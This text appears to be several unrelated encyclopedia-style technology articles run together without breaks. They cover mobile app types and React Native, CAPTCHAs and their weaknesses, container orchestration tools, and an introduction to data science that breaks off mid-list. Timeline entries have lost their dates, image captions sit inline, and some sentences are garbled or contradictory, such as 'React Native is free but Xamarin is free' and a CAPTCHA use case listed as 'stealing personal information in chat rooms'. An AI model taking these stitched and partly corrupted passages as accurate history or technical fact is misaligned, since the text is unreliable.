Three generations of mobile apps .
Source : Chauhan 2017 .
From a user perspective , mobile apps can be categorised as educational , informational , productivity , gaming , entertainment , communication , eCommerce , and so on .
This article is more from a developer 's perspective , the different technologies that power mobile apps .
The earliest apps interfaced directly with the native capabilities of the platform on which they were deployed .
This was the case with apps running on Symbian OS .
Later , when the iPhone ( 2007 ) and Android ( 2008 ) came out , the app ecosystem became fragmented .
App developers had to develop separately for iOS and Android .
To solve this problem and reuse code , hybrid apps were invented but they had performance limitations .
In the 2010s , cross - platform development became possible by interfacing with native capabilities without sacrificing performance .
What are the different types of mobile apps ?
An overview of the types of mobile apps .
Source : Virus Brain 2017 .
There are three broad types of mobile apps : Native : Apps are developed for a specific platform using the platform 's native APIs .
It 's therefore performant and has full access to device capabilities .
The platform 's ecosystem , such as an app store , helps in distributing the app .
Code can not be reused for other platforms .
Examples are iOS ( Swift or Objective - C ) , Android ( Kotlin or Java ) , Windows Phone ( C # .NET ) .
Hybrid : App is developed using web technologies but is wrapped inside a native app .
Code can be reused across platforms .
Apps can also access native APIs .
Examples are Ionic , Sencha Touch .
Mobile Web : App is developed with web technologies and delivered via a web browser .
Typically , these are web apps with a responsive design so that they display well on smaller devices as well .
Business logic is on the server and only a single codebase needs to be maintained .
There 's no need to install anything from app stores .
Progressive Web Apps ( PWA ) deliver a mobile app - like experience via a web browser .
Could you explain how hybrid mobile apps work ?
The app is developed using web technologies , WebView and Cordova .
Source : WaveMaker Docs 2018 .
The term " hybrid " implies that the app uses a mix of web technologies and native APIs .
HTML5 , CSS and JS are used so that the same code can be reused across platforms .
Native APIs are used to get access to cameras , geolocation , etc .
In the case of Ionic , which is based on Cordova , WebView is used .
This is a browser instance that interprets and renders the UI .
It 's wrapped within the app .
Cordova takes care of the wrapping and interfacing with the native APIs .
Hybrid apps have to live with the limitations of WebView and , therefore , performance could suffer .
The latest native capabilities may not be available unless platforms such as Ionic keep pace with the changes .
To overcome this , platforms such as Appcelerator Titanium ( JavaScript ) , React Native ( JavaScript ) , NativeScript ( JavaScript / TypeScript ) and Xamarin ( C # ) take a different approach .
App can be written in another language but then compiled or interpreted to call native APIs .
Thus , code reuse is possible without sacrificing performance .
Such apps may be called " hybrid native apps " or even simply " native apps " .
What are the metrics by which we should evaluate mobile app platforms ?
Some metrics include development cost , performance , distribution , monetization , device features and their accessibility , user interface , code portability , and maintenance .
For example , native platforms give full access to device features and better performance .
The codebase of hybrid apps is easier to maintain at lower cost and can be ported to another platform more easily .
Native apps are typically distributed through app stores .
Hybrid apps can be distributed directly but they lose the benefits of app store discovery .
You may also want to look at availability , compilation , development environment , programming language / platform and community support .
For example , React Native is free but Xamarin is free , subject to the terms and conditions of Visual Studio Community Edition .
Just - in - time compilation is not possible for iOS on both React Native and Xamarin .
React Native and TypeScript are based on JavaScript and therefore easier for web developers .
Developers coming from C # and .NET background will find Xamarin easier to adopt .
A larger community means that you can find third - party packages and UI components .
How should I choose the right platform for my next mobile app ?
A decision was made to choose the right type of mobile app .
Source : Trigger 2018 .
Developers skilled in native platforms are difficult to find and costly .
For each platform , you would need a different skill set .
If you want your app to reach a broad audience across platforms , then either a mobile web app or hybrid app must be preferred .
These allow code reuse across platforms .
If your app involves heavy graphics such as in gaming , requires full access to device capabilities , or full control of the UI , then native apps will offer these .
In fact , if your app is targeted at only a specific platform such as iOS , then going native is a sensible approach .
To obtain native performance while also reusing as much of the code as possible across platforms , React Native , NativeScript , Xamarin , etc .
can be adopted .
What you adopt should depend on the maturity and support of the technology , plus the skill sets available to you .
For example , C # and .NET developers can adopt Xamarin while JavaScript developers can adopt React Native or NativeScript .
Psion Software has been renamed as Symbian Ltd , and its EPOC32 becomes Symbian OS .
Symbian OS forms the basis of many UI variants , including Series 80 , Series 60 , UIQ and MOAP .
This UI fragmentation makes it difficult to deliver apps across the variants .
Symbian programming is via Symbian C++ .
It 's low level and difficult .
In 2011 , this was replaced with Qt - based development , but it came too late against competition from iOS and Android .
Apple launched the very first iPhone in June 2007 .
The iPhone offers a capacitive touchscreen , which is vastly superior to the resistive touchscreens of Symbian - based phones .
The OS is named iPhone OS .
The initial idea was that developers would build web apps that would be rendered on the Safari web browser ; but in February 2008 , Apple released the iPhone SDK to enable third - party native apps .
In June 2010 , the iPhone OS was renamed iOS .
Google releases beta version 1.0 of Android for developers .
Developers can make native apps for the Android platform .
The first Android phone named T - Mobile G1 ( or HTC Dream ) was announced in September 2008 .
A startup named Nitobi creates PhoneGap , for developing cross - platform hybrid apps .
Using only HTML5 , CSS and JS , it provides APIs to access native capabilities .
Apps created with PhoneGap use WebView .
In 2011 , Adobe purchased PhoneGap .
It also open sources the code via the Apache Software Foundation ( ASF ) .
The open source variant is called Apache Cordova .
To facilitate mobile apps using web technologies such as HTML5 , CSS and JS , Sencha Touch has been released .
Developers can build UIs that look like native UIs .
It also supports Cordova APIs to allow access to accelerometers , cameras , geolocation , etc .
Tizen 's architecture allows different types of apps .
Source : Gadyatskaya et al .
2014 , fig .
2 .
Samsung released Tizen , an OS that can be used on a wide range of embedded devices , including smartphones .
The first smartphone to run on Tizen is planned for a 2014 launch in Russia but cancelled due to lack of apps .
The first smartphone comes out in India in January 2015 , the Samsung Z1 .
Tizen is based on the Linux kernel .
Developers can use it to build native apps ( C++ ) , web apps ( HTML5 ) or even hybrid apps .
For mobile app development on .NET and C # , Xamarin 2.0 has been released .
This includes Xamarin Studio , an IDE that integrates well with iOS and Android SDKs for cross - platform mobile app development .
The release also allows developers to write native iOS apps in Visual Studio using C # .
Xamarin as a company dates from May 2011 .
A startup named Drifty , founded in 2012 , released Ionic , an open - source HTML5-based platform for building hybrid apps .
Ionic itself is based on Cordova .
Facebook open source React Native , which is a framework for building cross - platform native mobile apps using JavaScript and React .
At the Mobile World Congress 2018 , Google released the first beta of Flutter , a mobile UI framework to build native interfaces for both iOS and Android .
Flutter is written in Dart programming language .
Source : React Native combines the best of native and web .
Source : Choi 2017 .
Traditionally , native mobile apps have been developed in specific languages , called platform - specific APIs .
For example , Objective - C and Swift for iOS app development ; Java and Kotlin for Android app development .
This means that developers who wish to release their apps on multiple platforms will have to implement them in different languages .
To avoid this duplication , hybrid apps came along .
The app was implemented using web technology , but instead of running it inside a web browser , it was wrapped and distributed as an app .
But it had performance limitations .
React Native enables web developers to write code once , deploy it on any mobile platform and also use the platform 's native API .
React Native is a platform for building native mobile apps using JavaScript and React .
As a developer , why should I adopt React Native ?
The React Native framework includes a bridge between the JS world and the native world .
Source : Soral 2018 .
Since React Native allows developers to maintain a single codebase even when targeting multiple mobile platforms , development work is considerably reduced .
Code can be reused across platforms .
If you 're a web developer new to mobile app development , there 's no need to learn a new language .
You can reuse your current web programming skills and apply them to the mobile app world .
Your knowledge of HTML , CSS and JS will be useful , although you 'll be applying them in a different form in React Native .
React Native uses ReactJS , which is a JS library invented and later open sourced by Facebook .
ReactJS itself has been gaining adoption because it 's easy to learn for a JS programmer .
It 's performant due to the use of virtual DOM .
The recommended syntax are ES6 and JSX .
ES6 brings simplicity and readability to JS code .
JSX is a combination of XML and JS to build a reusable component - based UI .
How is React Native different from ReactJS ?
React Native extends ReactJS .
Source : Vijay 2017 .
React Native is a framework whereas ReactJS is a library .
In ReactJS projects , we typically use a bundler such as Webpack to bundle necessary JS files for use in a browser .
In React Native , we need only a single command to start a new project .
All basic modules required for the project will be installed .
We also need to install Android Studio for Android development and Xcode for iOS development .
In ReactJS , we are allowed to use HTML tags .
In React Native , we create UI components using React Native components that are specified using JSX syntax .
These components are mapped into native UI components .
Thus , we ca n't reuse any ReactJS libraries that render HTML , SVG or Canvas .
In ReactJS , styling is done using CSS , like in any web app .
In React Native , styling is done using JS objects .
For component layout , React Native 's Flexbox can be used .
CSS animations are also replaced with the Animated API .
How does React Native work under the hood ?
Control flows across the bridge between native and JS worlds .
Source : Bircan 2017 .
Between the native and JavaScript worlds is a bridge ( implemented in C++ ) through which data flows .
Native code can be called JS code and vice versa .
To pass data between the two , data is serialized .
For example , an UI event is captured as a native event but the processing for this is done in JavaScript .
The result is serialized and sent over the bridge to the native world .
The native world deserializes the response , does any necessary processing and updates the UI .
What are some useful developer features of React Native ?
React Native offers the following : Hot Reloading : Small changes to your app will be immediately visible during development .
If business logic is changed , Live Reload could be used instead .
Debugging : Chrome Dev Tools can be used for debugging your app .
In fact , your debugging skills from the web world can be applied here .
Publishing : Publishing your app is easy using CodePush , now part of Visual Studio App Center .
Device Access : React Native gets access to camera , sensors , contacts , geolocation , etc .
Declarative : UI components are written in a declarative manner .
Component - based architecture also means that one developer need not worry about breaking another 's work .
Animations : For performance , these are serialized and sent to the native driver .
They run independent of the JS event loop .
Native Code : Native code and React Native code can coexist .
This is important because reacting to native APIs may not support all native functionality .
How does React Native compare against platforms in terms of performance ?
Since React Native is regularly being improved with each release , we can accept better performance than what we state below .
A comparison of React Native against iOS native programming using Swift showed comparable performance of CPU usage for list views .
When resizing maps , Swift was better by 10 % , but React Native uses far less memory here .
For GPU usage , Swift outperforms marginally except for list views .
React Native apps can leak memory .
Therefore , ` FlatList ` , ` SectionList ` , or ` VirtualizedList ` could be used rather than ` ListView ` .
The communication between native and JS runtimes over the bridge is via message queues .
This is also a performance bottleneck .
For better performance , ReactNavigation is recommended over the Navigator component .
When compared against the Ionic platform , React Native outperforms Ionic across metrics such as CPU usage , memory usage , power consumption and list scrolling .
Are there real - world examples of who 's using React Native ?
Facebook and Instagram use React Native .
Other companies or products using it include Bloomberg , Pinterest , Skype , Tesla , Uber , Walmart , Wix , Discord , Gyroscope , SoundCloud Pulse , Tencent QQ , Vogue , and many more .
Walmart moved to React Native because it was hard to find skilled developers for native development .
They used an incremental approach by migrating parts of their code to React Native .
They were able to reuse 95 % of their code between iOS and Android .
They could reuse business logic with their web apps as well .
They could deliver quick updates from their server rather than an app store .
Bloomberg developed their app in half the time using React Native .
They were also able to push updates , do A / B testing and iterate quickly .
Airbnb engineers write code for the web , iOS and Android .
With React Native , they stated , it 's now feasible for us to have the same engineer skilled in JavaScript and React write the feature for all three platforms .
However , in June 2018 , Airbnb decided to move away from React Native and back to native development due to technical and organizational challenges .
What backendshouldIuseformy React Native app ?
React Native provides UI components .
However , the React Native ecosystem is vast .
There are frameworks / libraries for AR / VR , various editors and IDEs that support React Native , local databases ( client - side storage ) , performance monitoring tools , CI / CD tools , authentication libraries , deep linking libraries , UI frameworks , and more .
Specifically for backends , Mobile Backend as a Service ( MBaaS ) is now available .
Some options include RN Firebase , Baqend , RN Back , Feather and Graph Cool .
These services make it easy for developers to build their React Native apps .
The more traditional approach is to build and manage your own backend .
Some developers choose Node.js or Express.js because these are based on JavaScript that they 're already using to build React Native UI .
This can be paired with a database such as Firebase , MySQL , or MongoDB .
Another option is to use Django with GraphQL .
Even WordPress can be used , especially if the app is content driven .
These are merely some examples .
Developers can use any backend that suits their expertise and app requirements .
Could you point me to some useful React Native developer resources ?
Here are some useful resources : Expo is a free and open source toolchain for your React Native projects .
Expo also has a collection of apps developed and shared by others .
The easiest way to create a new app is to use the create - react - native - app codebase .
If you wish to learn by studying app code written by others , React Active News maintains a curated list of open - source React Native apps .
React.parts is a place to find reusable components for React Native .
Visual Studio App Center is a useful tool to build and release your app .
Use React Navigation for routing and navigation in React Native apps .
React Native provides only the UI , but here 's a great selection of tools to complement React Native .
At Facebook , Jordan Walke and his team released ReactJS , a JavaScript library that brings a new way of rendering pages with more responsive user interactions .
A web page can be built from a hierarchy of UI components .
React Native starts as an internal hackathon project within Facebook .
Meanwhile , ReactJS is open - source .
Facebook open sources React Native for iOS on GitHub .
The release of Android comes in September .
Microsoft and Samsung are committed to adopting React Native for Windows and Tizen .
React Native has seen a number of improvements over the years : better navigation , smoother list rendering , more performant animations , and more .
CAPTCHA is an acronym for Completely Automated Public Turing Test To Tell Computers and Humans Apart .
CAPTCHA may be described as a cyber security tool often used on websites .
Websites that offer a service or collect data require the user to give inputs .
This process can be thwarted with the use of bots .
Bots can present themselves as humans with fake identities .
CAPTCHAs are designed in many ways , but all of them have the same goal : to let humans into the system and deny admission to bots .
They attempt to do this by presenting problems that are hard for bots to solve but relatively easy for humans to solve .
With the coming of Artificial Intelligence ( AI ) , computers have become smarter at solving CAPTCHAs .
Therefore , CAPTCHAs themselves have evolved to counteract intelligent bots .
Where do we need CAPTCHAs ?
Automated programs or bots are fast compared to humans .
This gives bots an unfair advantage .
For example , bots can book tickets in bulk and then sell them later at a higher price on the black market .
Likewise , bots can generate bulk votes and thereby skew the results of an online voting system .
Bots can also be used to spam , troll or trigger DDoS attacks .
Here are some use cases where CAPTCHAs are useful : Booking of tickets .
Online voting system .
Creating a new online / email account .
Preventing dictionary attacks on password systems .
Promoting products as a comment to a blog post .
Liking or sharing a web page via social networking sites .
Protecting site content from scrapers or search engine bots .
Stealing personal information in chat rooms .
Why is a CAPTCHA sometimes called a reverse Turing test ?
The Turing test was conceived in 1950 by Alan M. Turing as a way to check if machines were as intelligent as humans .
If a human interrogator interacting electronically with a machine and another human can not tell which of them is the machine , then the machine passes the Turing test .
With CAPTCHA , the interrogator is not a human but a computer .
Hence , the term reverse Turing test is sometimes used .
What are the different types of CAPTCHAs ?
reCAPTCHA V2 shows a checkbox and optionally a set of images .
Source : Shet 2014 .
The following is a broad classification : Text - based : Users have to type the characters from a distorted text .
Image - based : Users are asked to select images belonging to a certain group , such as those containing cats .
Video - based : Users are shown short video clips and asked to answer a question based on them .
NuCAPTCHA is an example .
Audio - based : Users listen to an audio clip and type what they hear .
Action - based : Users are asked to perform some action .
reCAPTCHA V2 asks users to click a checkbox .
MotionCAPTCHA asks users to trace a shape on the canvas .
Dynamic Cognitive Game ( DCG ) is another example .
Question - based : Users are presented a question that they have to answer correctly .
Examples include " What is 1 + six ?
" or " Flower , resting , lawyer , campsite : the word starting with ' c ' ?
" Fun - based : Users are asked to solve a puzzle or play a game .
Bongo is an example .
PlayThru from Are You A Human is another example .
Invisible : User verification is done in the background without requiring specific user inputs .
Google introduced this with its Invisible reCAPTCHA .
Hybrid : Combination of the above .
How are CAPTCHAs related to AI ?
Computers are getting faster and have access to more memory than before .
The algorithms that power them are getting better .
So tasks that were once difficult for computers are becoming easier .
This means CAPTCHAs that were previously unsolvable are becoming solvable by bots .
Advances in optical character recognition ( OCR ) have enabled bots to solve text - based CAPTCHAs .
Image - based CAPTCHAs can be cracked due to advances in image processing , pattern recognition and object recognition .
Question - based CAPTCHAs rely on advances in natural language processing ( NLP ) .
Audio - based CAPTCHAs too , can be solved due to advances in speech - to - text processing .
With reCAPTCHA , humans assist machines in solving difficult problems .
All these contribute to machines getting smarter everyday .
Ultimately , we have to come up with better CAPTCHAs to defeat smarter bots .
A CAPTCHA that 's secure today may not be so tomorrow .
reCAPTCHA 's creator Luis von Ahn commented in 2012 that CAPTCHAs could become useless in another ten years .
What techniques are typically used to solve CAPTCHAs ?
Let 's note that text - based are presented as images .
To solve text - based CAPTCHAs , segmenting the text into individual characters is the first step .
One way to enhance OCR is to remove noise .
Image transformation such as rotating , shifting , mirroring , warping can lead to better OCR .
With audio , waveform analysis can help in solving CAPTCHA .
Machine learning that solves segmentation and recognition problems simultaneously has been shown to give better results .
Some sites do n't implement CAPTCHA in a secure manner .
They can be vulnerable due to reuse of session ID of a known CAPTCHA image .
Web services have come up to solve CAPTCHAs : Death by CAPTCHA , 2Captcha .
Where economics makes sense , some of these use humans to solve the CAPTCHAs .
Some web services forward CAPTCHA to pornographic sites .
Visitors need to solve the CAPTCHA before they can view pornographic content .
It 's been argued that this is not really economical .
Are there guidelines for making good CAPTCHAs ?
Some guidelines are worth noting : Accessibility : Give users options .
Audio CAPTCHAs are suited for the visually imparied .
Allow users to request another CAPTCHA if a particularly hard one comes up .
With touchscreen interfaces , text - based CAPTCHAs are less suited compared to CAPTCHAs that require clicks or drag - and - drop actions .
Dynamic generation : Avoid serving CAPTCHAs from a fixed database .
CAPTCHAs should be generated dynamically .
Avoid using trivial distortions .
Avoid reuse of CAPTCHAs .
Security : Avoid sending the solutions to the client along with the challenge .
What are reCAPTCHAs ?
reCAPTCHA helps with digitization .
Source : Von Ahn et al .
2008 , fig .
1 .
reCAPTCHA was invented by researchers at Carnegie Mellon University in 2007 .
It used distorted characters in the text .
Rather than using just one word , a pair of words was presented to the user .
One of these words is known to the CAPTCHA system but the other one is unknown .
Such unknown words , rather than being randomly generated , were picked up from old books or articles that were being digitized .
Since state - of - the - art OCR systems have difficulty deciphering these words , why not crowdsource this task to humans via CAPTCHA ?
It was with this idea that reCAPTCHA was born .
Thus , reCAPTCHA in its original form helped in digitizing scanned text .
In 2008 , it was claimed that the system had transcribed 440 million words via 40,000 sites .
reCAPTCHA was acquired by Google in 2009 .
It evolved into No CAPTCHA reCAPTCHA ( aka reCAPTCHA V2 ) in 2014 .
In 2017 , Google introduced Invisible CAPTCHA .
With these newer versions , the CAPTCHA system tracks user behaviour to determine if it 's coming from a bot .
This includes mouse movement , scrolling of the page , time taken to submit a form , and many more .
How effective are CAPTCHAs in stopping bots ?
One of the early CAPTCHAs , Gimpy , was used by Yahoo .
In October 2002 , a program was able to solve Gimpy CAPTCHAs .
Back in 2005 , W3C stated that many CAPTCHA systems could be solved with 88 - 100 % accuracy .
At PARC , one researcher was able to crack Assira CAPTCHA with 7.5 % probability .
Blogger Jeff Atwood reports that CAPTCHAs of Yahoo , Hotmail and Google were broken in early 2008 .
A Stanford team showed in 2010 that their Decaptcha tool could bypass many text - based CAPTCHAs .
At a conference in 2012 , a program was able to solve Google 's audio CAPTCHA 99.1 % of the time .
In 2013 , Vicarious AI claimed to be able to solve CAPTCHAs 90 % of the time .
Google itself reported that distorted text can be solved by AI with 99.8 % accuracy .
Using machine learning , researchers in 2014 were able to crack reCAPTCHA with a 33 % success rate and Baidu at 39 % .
This does not mean that CAPTCHAs are useless .
It just means that current CAPTCHAs have to be better than what AI is capable of solving .
Are there alternatives to using CAPTCHAs ?
The WCAG Working Group of W3C has a list of alternatives to using CAPTCHAs .
Another list is by Karl Groves .
It 's important to note that alternatives may not work all the time , since smart bots may find a way , now or in the future , to bypass them .
Honeypots and timestamp analysis are alternatives that have proven effective .
Another option is to use an anti - spam service such as Akismet , Mollom and SBlam .
It 's possible to enforce user verification via emails or text messages sent to their mobiles .
While this may defeat bots , it reduces usability for humans .
Game - based CAPTCHAs are still CAPTCHAs but they are less annoying and more fun for users .
It has been claimed that PlayThru takes on average 10 - 12 seconds compared to 12 seconds for text - based CAPTCHA .
What are the accessibility issues surrounding CAPTCHAs ?
A selection of CAPTCHAs hard for humans to solve .
Source : Munsell 2012 .
In response to smarter bots , CAPTCHAs have gotten more sophisticated .
Unfortunately , this makes it harder for humans as well .
A study from 2009 found that while CAPTCHAs reduced spam , they also reduced conversion rates .
Another study with Animoto web app showed that conversion rates were better by 33 % without using CAPTCHAs .
A survey from 2010 showed that audio CAPTCHAs for non - native speakers of English are hard .
Even with text - based CAPTCHAs , some text can be hard to solve .
In 2000 , the success rate was 97 % but this dropped to 92 % in 2012 .
It has been claimed that CAPTCHAs ignore issues that senior citizens and visually impaired people face .
A study from 2009 with visually impaired people showed that with audio CAPTCHAs success rates were only 45 % and it took users 65 seconds to solve one .
Harry Brignull has even questioned the approach , " Using CAPTCHA is a way of announcing to the world that you ’ve got a spam problem , that you do n’t know how to deal with it , and that you ’ve decided to offload the frustration of the problem onto your user - base .
" Can you name some providers of CAPTCHAs ?
Google 's reCAPTCHA is well known .
As of March 2017 , more than a million websites are using it .
Also , 11.2 % of the top 10k sites use it .
NoMoreCaptchas is a possible alternative to Invisible reCAPTCHA since it does not require explicit input from users .
PICATCHA is an image - based CAPTCHA that is also used as an advertising medium .
Microsoft had a research project named Asirra that used image - based CAPTCHA .
Confident CAPTCHA claims a 96 % success rate and usage of 50 million verfications per month .
Other examples are Ironclad CAPTCHA , PlayThru , NuCAPTCHA and Solve Media .
Site captchas.net is a free service .
BotDetect CAPTCHA uses image and sound .
JCAPTCHA , implemented in Java , can be downloaded and integrated into websites .
Dice Captcha shows pictures of dice .
In my automated tests , how can I test form submissions that have CAPTCHAs ?
One approach is to disable CAPTCHAs during testing .
Depending on the system , this could be in code or a flag in the database .
Attempting to automatically solve CAPTCHAs is a fundamentally flawed approach .
If test automation can be solved , it really suggests that CAPTCHA is not strong enough to prevent bots from passing themselves off as humans .
DEC uses a pixelated image of the US flag as CAPTCHA for gathering opinion polls before the US Presidential Election in 1996 .
This method does n't work very well .
Simple programs could click the flag correctly .
Block diagram showing text - based CAPTCHA generation process .
Source : Lillibridge et al .
1998 , fig .
3 .
Scientists at DEC , led by Andrei Broder , designed a noise - induced text - based CAPTCHA .
This is used by AltaVista to prevent bots from adding URLs to the search engine 's platform .
Luis von Ahn , Manuel Blum , Nicholas Hopper and John Langford of Carnegie Mellon University came up with a better text - based CAPTCHA .
They coin the term CAPTCHA .
reCAPTCHA was invented at Carnegie Mellon University .
Later , as part of Google , Google deprecated this version in May 2016 , and shut it down in March 2018 .
Inventors of reCAPTCHA introduced the audio version of the similar .
Google acquired reCAPTCHA since it can also assist with digitization as part of Google Books and Google News Archive Search .
Also known as reCAPTCHA v1 , it was shutdown in March 2018 .
Google releases reCAPTCHA v2 , also known as No CAPTCHA reCAPTCHA .
Users merely have to click a checkbox that says " I 'm not a robot " .
Google launched a variant of reCAPTCHA v2 and calls it Invisible reCAPTCHA .
This does not require explicit user inputs .
Different versions of reCAPTCHA for website integration .
Source : Google Developers 2019 .
Google launches reCAPTCHA v3 .
This does n't require users to solve any CAPTCHA and gives greater control to website owners .
reCAPTCHA v3 returns a score ( 1.0 for good interaction , 0.0 for a likely bot ) .
Based on this score , website owners can take appropriate action .
In March 2019 , it was reported that reCAPTCHA v3 had been partially tricked by an AI program using Reinforcement Learning .
The orchestrator manages containers across nodes .
Source : Mónica 2017 .
Container orchestration is the process of deploying containers on a computed cluster consisting of multiple nodes .
Orchestration tools extend lifecycle management capabilities to complex , multi - container workloads deployed on a cluster of machines .
By abstracting the host infrastructure , container orchestration tools allow the users to deploy the entire cluster as a single deployment target .
The rise of lightweight and flexible containers has given rise to new application architectures and fundamentally changed how applications are deployed and visualised today .
The containerisation approach is to package the different services that constitute an application into separate computed containers , and to deploy those containers across a cluster of physical or virtual machines .
With the rise of containerisation , the need for container orchestration is all but obvious .
As a definition , Container orchestration is a process that automates the deployment , management , scaling , networking , and availability of container - based applications .
What 's the process of Container Orchestration ?
The process of deploying containers to multiple virtual machines or physical machines within a cluster to implement an application can be optimized through automation .
This becomes more and more valuable as the number of containers and hosts grows .
Container Orchestration envisions a number of features , some of which are mentioned below : Provisioning hosts Instantiating a set of containers Rescheduling failed containers Linking containers together through agreed interfaces Exposing services to machines outside of the cluster Scaling out or down the cluster by adding or removing containers Where does container orchestration fit within the system stack ?
Orchestration sits between the apps and the container runtimes .
Source : AWSforBusiness 2017 .
Container orchestration mediates between the apps or services above and the container runtimes below .
Three main functional aspects of what they do include : Service Management : Labels , groups , namespaces , dependencies , load balancing , readiness checks .
Scheduling : Allocation , replication , resurrection , rescheduling , rolling deployment , upgrades , downgrades .
Resource Management : Memory , CPU , GPU , volumes , ports , IPs .
A survey from 2016 indicated that among the features considered important are Scheduling , Cluster Management , Service Discovery , Provisioning and Monitoring .
In addition to the above , there are a number of non - functional aspects that are important : scalability , availability , flexibility , usability , portability , and security .
What are some Container Orchestration tools available ?
A selection of container orchestration tools .
Source : Gill 2018 .
Some container orchestration tools worth mentioning include the following : Docker Swarm : Provides native clustering functionality for Docker containers , which turns a group of Docker engines into a single , virtual Docker engine .
Google Container Engine : Google Container Engine , built on Kubernetes , lets you run Docker containers on the Google Cloud .
Kubernetes : An orchestration system for Docker containers .
It handles scheduling and manages workloads based on user - defined parameters .
Mesosphere Marathon : Marathon is a container orchestration framework for Apache Mesos that is designed to launch long - running applications .
Amazon ECS : The ECS supports Docker containers and lets you run applications on a managed cluster of Amazon EC2 instances .
Azure Container Service ( ACS ) : ACS lets you create a cluster of virtual machines that act as container hosts along with master machines that are used to manage your application containers .
Cloud Foundry ’s Diego : Container management system that combines a scheduler , runner , and health manager .
CoreOS Fleet : Container management tool that lets you deploy Docker containers on hosts in a cluster as well as distribute services across a cluster .
Which container orchestration tool should I use ?
It 's been said that Kubernetes have been widely adopted , particularly for stateless , composable workloads .
Marathon is designed for long - running apps .
Marathons can handle persistent containers .
Those offered by Google , Amazon and Microsoft may result in vendor lock - in : it may be difficult to move your app to another provider at a later point .
If you wish to build your own Platform - as - a - Service ( PaaS ) , take a look at Cloud Foundry .
Among the lesser known names are Cattle , Shipyard , Nomad , Empire , Aurora , Singularity , PaaSTA and Titus .
In fact , some are tools and some are frameworks .
Kubernetes is an orchestrator by itself .
Apache Mesos is a distributed systems kernel upon which you can build custom orchestrators .
DC / OS and Marathon are implementations on top of Mesos .
The Shipyard is considered an orchestrator orchestrator because it uses the Docker Swarm .
Amazon EC2 is an IaaS and Empire is a PaaS for containers , and both these have orchestrators built into them .
What are some security considerations when working with container orchestration tools ?
While many of the concerns when using containers are common in bare metal deployments , containers provide an opportunity to improve levels of security if used properly .
Because containers are so lightweight and easy to use , it 's easy to deploy them for very specific purposes , and the container technology helps ensure that only the minimum required capabilities are exposed .
Are there alternatives to managing containers without using an orchestration platform ?
Different ways by which teams manage their containers .
Source : Hecht 2016 .
While orchestration platforms ( Docket Swarm , Kubernetes ) are easier to use , there are other alternatives that may suit some teams .
Those with a programming background could use shell scripting to customize to their requirements .
The same can be said of those who use configuration management tools for deployment .
On the other end of the scale , teams can simply subscribe to a Containers - as - a - Service ( CaaS ) for minimal maintenance .
For example , Google Kubernetes Engine ( GKE ) abstracts and manages Kubernetes master nodes for you .
Mesos architecture .
Source : Hindman et al .
2011 , fig .
2 .
At UC Berkeley , Mesos started as a research project to improve cluster utilization .
The concept of containers is unknown at this time , but there 's a need to manage clusters of resources .
Cluster frameworks MapReduce and MPI are examples .
Mesos gives a common layer spanning diverse cluster computing frameworks .
Version 1.0 of Kubernetes has been released .
It also became part of the Cloud Native Computing Foundation ( CNCF ) .
Kubernetes was previously open source by Google in June 2014 .
Hashicorp 's Nomad is released as a " cluster manager and scheduler designed for microservices and batch workloads " .
Version 1.0 of Docker Swarm is released .
During beta , it was used for running 1,000 nodes and 30,000 containers on EC2 .
It was able to schedule containers in less than half a second .
In July 2016 , it was released as part of Docker v1.12 and is known as Swarm Mode .
Docker announces that it will support Kubernetes .
This means that operations have more choice ( Docker Swarm Mode or Kubernetes ) for managing their clusters / containers .
Data is no longer scarce .
In fact , businesses have an abundance of data and it is growing .
This has given rise to the term Big Data .
Data science enables businesses to discover valuable insights from data and apply them profitably .
Data science is therefore complementary to Big Data .
Historically , statisticians had a mathematical focus .
They evolved into data analysts who applied their expertise to solving business problems .
They did this by visualizing data and searching for patterns .
When dealing with vast amounts of data , there was a need to apply Machine Learning algorithms and programming .
This is where a data scientist comes in .
A data scientist is really a first - class scientist who 's curious , asks questions and makes hypotheses that can be tested with data .
What exactly is the definition of the term " Data Science " ?
What is a Data Scientist ?
Source : Gualtieri 2013 .
One possible definition is that " data science is a multifaceted discipline , which encompasses machine learning and other analytic processes , statistics and related branches of mathematics , increasingly borrowed from high performance scientific computing , all in order to ultimately extract insight from data and use this new - found information to tell stories .
" At a high level , " data science is the study of the generalizable extraction of knowledge from data .
" It 's a combination of multiple disciplines that have been around for decades .
The Data Science Association 's Professional Code of Conduct states that a " Data Scientist means a professional who uses scientific methods to liberate and create meaning from raw data " .
What 's a typical Data Science process ?
The Data Science process .
Created at Harvard by Joe Blitzstein and Hanspeter Pfister .
Source : Venturi 2017 .
In science , one starts with a hypothesis , conducts experiments and makes observations to either prove or disprove the hypothesis .
In Data Science , the scientific process is similar , except that the use of data and algorithms becomes central to the process .
The process starts with an interesting question , often aligned to business goals .
Available data is then cleaned and filtered .
This may also involve collecting new data relevant to the question .
Data is analyzed to discover patterns and outliers .
A model is built and validated , often using machine learning algorithms .
The model is often refined in an iterative manner .
The final step is to communicate the results .
The results may inspire the data scientists to ask and investigate further questions .
What 's a typical Data Science pipeline ?
The Data Science pipeline .
Source : Jones 2018 .
The data science pipeline may be treated as a part of the data science process that deals specifically with data .
It starts with the gathering of raw data , processing it , analyzing it via algorithms and finally visualizing the results .
Thus , the pipeline basically transforms data into useful insights .
An important aspect of this pipeline is data engineering .
It can be broken down into three steps ( not standardized ) : Data Wrangling : Raw data is cast into a form suitable for analysis .
This could involve combining multiple datasets , removing inconsistencies , converting datasets to a common format , etc .
Data Cleansing : Real - world data is messy with missing values , bad delimiters or inconsistent records .
Cleansing ensures and even repairs data to syntactic and semantic correctness .
Data points could be dropped if they can not be repaired .
Data Preparation : This makes the data suitable as an input to algorithms .
This may involve range normalization , conversion of categorical data to numerical values , etc .
When building ML models , the typical approach is to partition available data into training and testing datasets .
The former is used for learning and the latter is used for validation .
Could you give some examples of questions that data science answers ?
Here are a few examples : Will this tire fail in the next 1000 miles ?
Is this bank transaction normal ?
What will be my sales for the next quarter ?
What sort of customers are not coming back to my store ?
Which printer models are failing in the same way ?
As a self - driving car , should I now slow down or brake completely ?
In the real world , data science has been successfully used by LinkedIn to increase growth in user connections .
Google uses it in a number of products .
GE uses it to optimize service contracts .
Netflix uses it to improve movie recommendation .
Kaplan uses it to uncover effective learning strategies .
All these are a result of data scientists asking the right questions .
How is a data scientist different from a data analyst / architect / engineer ?
Data Science is a mix of many disciplines .
Source : Barber 2018 .
A data scientist is multidisciplinary in terms of skills and expertise .
She may embody some of the other related roles : Data Analyst : Collects relevant data , visualizes data with various tools and tries to find patterns and insights .
He knows basic statistics .
Has business / domain knowledge .
It probably does n't deal with big data .
Data Architect : Architects a system to manage big data .
Often , this role is embodied within a data engineer since tools and technologies overlap .
